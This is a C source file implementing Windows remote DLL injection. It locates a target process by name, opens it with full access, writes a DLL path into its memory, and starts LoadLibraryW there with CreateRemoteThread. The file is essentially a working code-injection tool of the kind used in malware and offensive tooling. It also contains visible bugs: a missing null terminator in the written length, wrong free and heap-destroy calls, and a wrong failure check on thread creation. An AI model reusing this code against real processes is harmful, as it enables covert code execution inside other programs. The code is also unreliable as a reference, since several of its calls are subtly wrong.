#include "dllinjection.h"

HANDLE FetchProcess(IN LPWSTR pProcessName, OUT PDWORD dwProcessId)
{	
	HANDLE hSnapshot;
	HANDLE hHeap = INVALID_HANDLE_VALUE;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	
	PROCESSENTRY32 pe32Process = { .dwSize = sizeof(PROCESSENTRY32) };
	
	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) goto _cleanup;

	if ((hHeap = GetProcessHeap()) == 0) goto _cleanup;
	
	if (!Process32First(hSnapshot, &pe32Process)) goto _cleanup;

	do
	{
		WCHAR local_temp[MAX_PATH] = {L'\0'};
		for (int i = 0; i < lstrlenW(pe32Process.szExeFile); i++) 
		{
			local_temp[i] = (WCHAR)tolower(pe32Process.szExeFile[i]);
		}
		if (!wcscmp(local_temp, pProcessName)) 
		{ 
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Process.th32ProcessID);
			wprintf(L"[i] Opened a HANDLE to process: \"%s\"\n[i] Process id: %d", local_temp, pe32Process.th32ProcessID);
			goto _cleanup; 
		}
	} while (Process32Next(hSnapshot, &pe32Process));

	printf("[x] Failed to find the desired process.\n");
_cleanup:	
	*dwProcessId = pe32Process.th32ProcessID;

	if (hSnapshot) CloseHandle(hSnapshot);
	
	if (hHeap != INVALID_HANDLE_VALUE)HeapDestroy(hHeap);
	
	return hProcess;
}


BOOL InjectDll(HANDLE hProcess, LPWSTR DllName)
{
	BOOL state = FALSE;
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	
	SIZE_T BytesWritten;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	LPVOID pLoadLibraryW;
	LPVOID pAddress = NULL;
	
	if (!(pLoadLibraryW = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW"))) goto _cleanup;
			 
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto _cleanup;
	
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &BytesWritten)) goto _cleanup;
	
	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pAddress, 0, NULL)) == INVALID_HANDLE_VALUE) goto _cleanup;

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);

	state = TRUE;
_cleanup:
	if (pAddress) VirtualFree(pAddress, dwSizeToWrite, MEM_FREE);
	CloseHandle(hThread);
	getchar();
	return state;
}
